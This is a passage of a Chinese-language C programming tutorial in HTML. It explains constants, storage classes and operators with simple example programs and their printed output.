class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 10   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIDTH  5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEWLINE <span class="meta-string">'\n'</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">int</span> area;  </span><br><span class="line">  </span><br><span class="line">   area = LENGTH * WIDTH;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"value of area : %d"</span>, area);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%c"</span>, NEWLINE);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value of area : <span class="number">50</span></span><br></pre></td></tr></table></figure><h4 id="const-关键字"><a href="#const-关键字" class="headerlink" title="const 关键字"></a>const 关键字</h4><p>您可以使用 <strong>const</strong> 前缀声明指定类型的常量，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> type variable = value;</span><br></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">int</span>  LENGTH = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">int</span>  WIDTH  = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> NEWLINE = <span class="string">'\n'</span>;</span><br><span class="line">   <span class="keyword">int</span> area;  </span><br><span class="line">   </span><br><span class="line">   area = LENGTH * WIDTH;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"value of area : %d"</span>, area);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%c"</span>, NEWLINE);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value of area : <span class="number">50</span></span><br></pre></td></tr></table></figure><h2 id="C-存储类"><a href="#C-存储类" class="headerlink" title="C 存储类"></a>C 存储类</h2><p>存储类定义 C 程序中变量/函数的范围（可见性）和生命周期。这些说明符放置在它们所修饰的类型之前。下面列出 C 程序中可用的存储类：</p><ul><li>auto</li><li>register</li><li>static</li><li>extern</li></ul><h3 id="auto-存储类"><a href="#auto-存储类" class="headerlink" title="auto 存储类"></a>auto 存储类</h3><p><strong>auto</strong> 存储类是所有局部变量默认的存储类。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> mount;</span><br><span class="line">   <span class="keyword">auto</span> <span class="keyword">int</span> month;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的实例定义了两个带有相同存储类的变量，auto 只能用在函数内，即 auto 只能修饰局部变量。</p><h3 id="register-存储类"><a href="#register-存储类" class="headerlink" title="register 存储类"></a>register 存储类</h3><p><strong>register</strong> 存储类用于定义存储在寄存器中而不是 RAM 中的局部变量。这意味着变量的最大尺寸等于寄存器的大小（通常是一个词），且不能对它应用一元的 ‘&amp;’ 运算符（因为它没有内存位置）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="keyword">register</span> <span class="keyword">int</span>  miles;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寄存器只用于需要快速访问的变量，比如计数器。还应注意的是，定义 ‘register’ 并不意味着变量将被存储在寄存器中，它意味着变量可能存储在寄存器中，这取决于硬件和实现的限制。</p><h3 id="static-存储类"><a href="#static-存储类" class="headerlink" title="static 存储类"></a>static 存储类</h3><p><strong>static</strong> 存储类指示编译器在程序的生命周期内保持局部变量的存在，而不需要在每次它进入和离开作用域时进行创建和销毁。因此，使用 static 修饰局部变量可以在函数调用之间保持局部变量的值。</p><p>static 修饰符也可以应用于全局变量。当 static 修饰全局变量时，会使变量的作用域限制在声明它的文件内。</p><p>全局声明的一个 static 变量或方法可以被任何函数或方法调用，只要这些方法出现在跟 static 变量或方法同一个文件中。</p><p>以下实例演示了 static 修饰全局变量和局部变量的应用：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 函数声明 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count=<span class="number">10</span>;        <span class="comment">/* 全局变量 - static 是默认的 */</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (count--) &#123;</span><br><span class="line">      func1();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 'thingy' 是 'func1' 的局部变量 - 只初始化一次</span></span><br><span class="line"><span class="comment"> * 每次调用函数 'func1' 'thingy' 值不会被重置。</span></span><br><span class="line"><span class="comment"> */</span>                </span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">int</span> thingy=<span class="number">5</span>;</span><br><span class="line">  thingy++;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">" thingy 为 %d ， count 为 %d\n"</span>, thingy, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实例中 count 作为全局变量可以在函数内使用，thingy 使用 static 修饰后，不会在每次调用时重置。</p><p>可能您现在还无法理解这个实例，因为我已经使用了函数和全局变量，这两个概念目前为止还没进行讲解。即使您现在不能完全理解，也没有关系，后续的章节我们会详细讲解。当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">thingy 为 <span class="number">6</span> ， count 为 <span class="number">9</span></span><br><span class="line">thingy 为 <span class="number">7</span> ， count 为 <span class="number">8</span></span><br><span class="line">thingy 为 <span class="number">8</span> ， count 为 <span class="number">7</span></span><br><span class="line">thingy 为 <span class="number">9</span> ， count 为 <span class="number">6</span></span><br><span class="line">thingy 为 <span class="number">10</span> ， count 为 <span class="number">5</span></span><br><span class="line">thingy 为 <span class="number">11</span> ， count 为 <span class="number">4</span></span><br><span class="line">thingy 为 <span class="number">12</span> ， count 为 <span class="number">3</span></span><br><span class="line">thingy 为 <span class="number">13</span> ， count 为 <span class="number">2</span></span><br><span class="line">thingy 为 <span class="number">14</span> ， count 为 <span class="number">1</span></span><br><span class="line">thingy 为 <span class="number">15</span> ， count 为 <span class="number">0</span></span><br></pre></td></tr></table></figure><h3 id="extern-存储类"><a href="#extern-存储类" class="headerlink" title="extern 存储类"></a>extern 存储类</h3><p><strong>extern</strong> 存储类用于提供一个全局变量的引用，全局变量对所有的程序文件都是可见的。当您使用 <strong>extern</strong> 时，对于无法初始化的变量，会把变量名指向一个之前定义过的存储位置。</p><p>当您有多个文件且定义了一个可以在其他文件中使用的全局变量或函数时，可以在其他文件中使用 <em>extern</em> 来得到已定义的变量或函数的引用。可以这么理解，<em>extern</em> 是用来在另一个文件中声明一个全局变量或函数。</p><p>extern 修饰符通常用于当有两个或多个文件共享相同的全局变量或函数的时候，如下所示：</p><p><strong>第一个文件：main.c</strong></p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span> count ;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">write_extern</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   count = <span class="number">5</span>;</span><br><span class="line">   write_extern();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>第二个文件：support.c</strong> </p><p><strong>实例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> count;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_extern</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"count is %d\n"</span>, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这会产生 <strong>a.out</strong> 可执行程序，当程序被执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count is <span class="number">5</span></span><br></pre></td></tr></table></figure><h2 id="C-运算符"><a href="#C-运算符" class="headerlink" title="C    运算符"></a>C    运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>下表显示了 C 语言支持的所有算术运算符。假设变量 <strong>A</strong> 的值为 10，变量 <strong>B</strong> 的值为 20，则：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">把两个操作数相加</td><td align="left">A + B 将得到 30</td></tr><tr><td align="left">-</td><td align="left">从第一个操作数中减去第二个操作数</td><td align="left">A - B 将得到 -10</td></tr><tr><td align="left">*</td><td align="left">把两个操作数相乘</td><td align="left">A * B 将得到 200</td></tr><tr><td align="left">/</td><td align="left">分子除以分母</td><td align="left">B / A 将得到 2</td></tr><tr><td align="left">%</td><td align="left">取模运算符，整除后的余数</td><td align="left">B % A 将得到 0</td></tr><tr><td align="left">++</td><td align="left">自增运算符，整数值增加 1</td><td align="left">A++ 将得到 11</td></tr><tr><td align="left">–</td><td align="left">自减运算符，整数值减少 1</td><td align="left">A– 将得到 9</td></tr></tbody></table><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><p>下表显示了 C 语言支持的所有关系运算符。假设变量 <strong>A</strong> 的值为 10，变量 <strong>B</strong> 的值为 20，则：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">==</td><td align="left">检查两个操作数的值是否相等，如果相等则条件为真。</td><td align="left">(A == B) 为假。</td></tr><tr><td align="left">!=</td><td align="left">检查两个操作数的值是否相等，如果不相等则条件为真。</td><td align="left">(A != B) 为真。</td></tr><tr><td align="left">&gt;</td><td align="left">检查左操作数的值是否大于右操作数的值，如果是则条件为真。</td><td align="left">(A &gt; B) 为假。</td></tr><tr><td align="left">&lt;</td><td align="left">检查左操作数的值是否小于右操作数的值，如果是则条件为真。</td><td align="left">(A &lt; B) 为真。</td></tr><tr><td align="left">&gt;=</td><td align="left">检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。</td><td align="left">(A &gt;= B) 为假。</td></tr><tr><td align="left">&lt;=</td><td align="left">检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。</td><td align="left">(A &lt;= B) 为真。</td></tr></tbody></table><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>下表显示了 C 语言支持的所有关系逻辑运算符。假设变量 <strong>A</strong> 的值为 1，变量 <strong>B</strong> 的值为 0，则：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">称为逻辑与运算符。如果两个操作数都非零，则条件为真。</td><td align="left">(A &amp;&amp; B) 为假。</td></tr><tr><td align="left">||</td><td align="left">称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。</td><td align="left">(A || B) 为真。</td></tr><tr><td align="left">!</td><td align="left">称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。</td><td align="left">!(A &amp;&amp; B) 为真。</td></tr></tbody></table><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>下表列出了 C 语言支持的赋值运算符：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">=</td><td align="left">简单的赋值运算符，把右边操作数的值赋给左边操作数</td><td align="left">C = A + B 将把 A + B 的值赋给 C</td></tr><tr><td align="left">+=</td><td align="left">加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数</td><td align="left">C += A 相当于 C = C + A</td></tr><tr><td align="left">-=</td><td align="left">减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数</td><td align="left">C -= A 相当于 C = C - A</td></tr><tr><td align="left">*=</td><td align="left">乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数</td><td align="left">C *= A 相当于 C = C * A</td></tr><tr><td align="left">/=</td><td align="left">除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数</td><td align="left">C /= A 相当于 C = C / A</td></tr><tr><td align="left">%=</td><td align="left">求模且赋值运算符，求两个操作数的模赋值给左边操作数</td><td align="left">C %= A 相当于 C = C % A</td></tr><tr><td align="left">&lt;&lt;=</td><td align="left">左移且赋值运算符</td><td align="left">C &lt;&lt;= 2 等同于 C = C &lt;&lt; 2</td></tr><tr><td align="left">&gt;&gt;=</td><td align="left">右移且赋值运算符</td><td align="left">C &gt;&gt;= 2 等同于 C = C &gt;&gt; 2</td></tr><tr><td align="left">&amp;=</td><td align="left">按位与且赋值运算符</td><td align="left">C &amp;= 2 等同于 C = C &amp; 2</td></tr><tr><td align="left">^=</td><td align="left">按位异或且赋值运算符</td><td align="left">C ^= 2 等同于 C = C ^ 2</td></tr><tr><td align="left">|=</td><td align="left">按位或且赋值运算符</td><td align="left">C |= 2 等同于 C = C | 2</td></tr></tbody></table><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">21</span>;</span><br><span class="line">   <span class="keyword">int</span> c ;</span><br><span class="line"> </span><br><span class="line">   c =  a;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 1 - =  运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c +=  a;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 2 - += 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c -=  a;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 3 - -= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c *=  a;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 4 - *= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c /=  a;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 5 - /= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c  = <span class="number">200</span>;</span><br><span class="line">   c %=  a;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 6 - %= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c &lt;&lt;=  <span class="number">2</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 7 - &lt;&lt;= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c &gt;&gt;=  <span class="number">2</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 8 - &gt;&gt;= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c &amp;=  <span class="number">2</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 9 - &amp;= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c ^=  <span class="number">2</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 10 - ^= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">   c |=  <span class="number">2</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 11 - |= 运算符实例，c 的值 = %d\n"</span>, c );</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Line <span class="number">1</span> - =  运算符实例，c 的值 = <span class="number">21</span></span><br><span class="line">Line <span class="number">2</span> - += 运算符实例，c 的值 = <span class="number">42</span></span><br><span class="line">Line <span class="number">3</span> - -= 运算符实例，c 的值 = <span class="number">21</span></span><br><span class="line">Line <span class="number">4</span> - *= 运算符实例，c 的值 = <span class="number">441</span></span><br><span class="line">Line <span class="number">5</span> - /= 运算符实例，c 的值 = <span class="number">21</span></span><br><span class="line">Line <span class="number">6</span> - %= 运算符实例，c 的值 = <span class="number">11</span></span><br><span class="line">Line <span class="number">7</span> - &lt;&lt;= 运算符实例，c 的值 = <span class="number">44</span></span><br><span class="line">Line <span class="number">8</span> - &gt;&gt;= 运算符实例，c 的值 = <span class="number">11</span></span><br><span class="line">Line <span class="number">9</span> - &amp;= 运算符实例，c 的值 = <span class="number">2</span></span><br><span class="line">Line <span class="number">10</span> - ^= 运算符实例，c 的值 = <span class="number">0</span></span><br><span class="line">Line <span class="number">11</span> - |= 运算符实例，c 的值 = <span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="杂项运算符-↦-sizeof-amp-三元"><a href="#杂项运算符-↦-sizeof-amp-三元" class="headerlink" title="杂项运算符 ↦ sizeof &amp; 三元"></a>杂项运算符 ↦ sizeof &amp; 三元</h3><p>下表列出了 C 语言支持的其他一些重要的运算符，包括 <strong>sizeof</strong> 和 <strong>? :</strong>。</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">sizeof()</td><td align="left">返回变量的大小。</td><td align="left">sizeof(a) 将返回 4，其中 a 是整数。</td></tr><tr><td align="left">&amp;</td><td align="left">返回变量的地址。</td><td align="left">&a; 将给出变量的实际地址。</td></tr><tr><td align="left">*</td><td align="left">指向一个变量。</td><td align="left">*a; 将指向一个变量。</td></tr><tr><td align="left">? :</td><td align="left">条件表达式</td><td align="left"></td></tr></tbody></table><p><strong>示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">4</span>;</span><br><span class="line">   <span class="keyword">short</span> b;</span><br><span class="line">   <span class="keyword">double</span> c;</span><br><span class="line">   <span class="keyword">int</span>* ptr;</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* sizeof 运算符实例 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 1 - 变量 a 的大小 = %lu\n"</span>, <span class="keyword">sizeof</span>(a) );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 2 - 变量 b 的大小 = %lu\n"</span>, <span class="keyword">sizeof</span>(b) );</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Line 3 - 变量 c 的大小 = %lu\n"</span>, <span class="keyword">sizeof</span>(c) );</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* &amp; 和 * 运算符实例 */</span></span><br><span class="line">   ptr = &amp;a;    <span class="comment">/* 'ptr' 现在包含 'a' 的地址 */</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"a 的值是 %d\n"</span>, a);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"*ptr 是 %d\n"</span>, *ptr);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">/* 三元运算符实例 */</span></span><br><span class="line">   a = <span class="number">10</span>;</span><br><span class="line">   b = (a == <span class="number">1</span>) ? <span class="number">20</span>: <span class="number">30</span>;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"b 的值是 %d\n"</span>, b );</span><br><span class="line"> </span><br><span class="line">   b = (a == <span class="number">10</span>) ? <span class="number">20</span>: <span class="number">30</span>;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"b 的值是 %d\n"</span>, b );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Line <span class="number">1</span> - 变量 a 的大小 = <span class="number">4</span></span><br><span class="line">Line <span class="number">2</span> - 变量 b 的大小 = <span class="number">2</span></span><br><span class="line">Line <span class="number">3</span> - 变量 c 的大小 = <span class="number">8</span></span><br><span class="line">a 的值是 <span class="number">4</span></span><br><span class="line">*ptr 是 <span class="number">4</span></span><br><span class="line">b 的值是 <span class="number">30</span></span><br><span class="line">b 的值是 <span class="number">20</span></span><br></pre></td></tr></table></figure><h3 id="C-中的运算符优先级"><a href="#C-中的运算符优先级" class="headerlink" title="C 中的运算符优先级"></a>C 中的运算符优先级</h3><table><thead><tr><th align="left">类别</th><th align="left">运算符</th><th align="left">结合性</th></tr></thead><tbody><tr><td align="left">后缀</td><td align="left">() [] -&gt; . ++ - -</td><td align="left">从左到右</td></tr><tr><td align="left">一元</td><td align="left">+ - ! ~ ++ - - (type)* &amp; sizeof</td><td align="left">从右到左</td></tr><tr><td align="left">乘除</td><td align="left">* / %</td><td align="left">从左到右</td></tr><tr><td align="left">加减</td><td align="left">+ -</td><td align="left">从左到右</td></tr><tr><td align="left">移位</td><td align="left">&lt;&lt; &gt;&gt;</td><td align="left">从左到右</td></tr><tr><td align="left">关系</td><td align="left">&lt; &lt;= &gt; &gt;=</td><td align="left">从左到右</td></tr><tr><td align="left">相等</td><td align="left">== !=</td><td align="left">从左到右</td></tr><tr><td align="left">位与 AND</td><td align="left">&amp;</td><td align="left">从左到右</td></tr><tr><td align="left">位异或 XOR</td><td align="left">^</td><td align="left">从左到右</td></tr><tr><td align="left">位或 OR</td><td align="left">|</td><td align="left">从左到右</td></tr><tr><td align="left">逻辑与 AND</td><td align="left">&amp;&amp;</td><td align="left">从左到右</td></tr><tr><td align="left">逻辑或 OR</td><td align="left">||</td><td align="left">从左到右</td></tr><tr><td align="left">条件</td><td align="left">?:</td><td align="left">从右到左</td></tr><tr><td align="left">赋值</td><td align="left">= += -= *= /= %=&gt;&gt;= &lt;&lt;= &amp;= ^= |=</td><td align="left">从右到左</td></tr><tr><td align="left">逗号</td><td align="left">,</td><td align="left">从左到右</td></tr></tbody></table><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> a = <span class="number">20</span>;</span><br><span class="line">   <span class="keyword">int</span> b = <span class="number">10</span>;</span><br><span class="line">   <span class="keyword">int</span> c = <span class="number">15</span>;</span><br><span class="line">   <span class="keyword">int</span> d = <span class="number">5</span>;</span><br><span class="line">   <span class="keyword">int</span> e;</span><br><span class="line"> </span><br><span class="line">   e = (a + b) * c / d;      <span class="comment">// ( 30 * 15 ) / 5</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"(a + b) * c / d 的值是 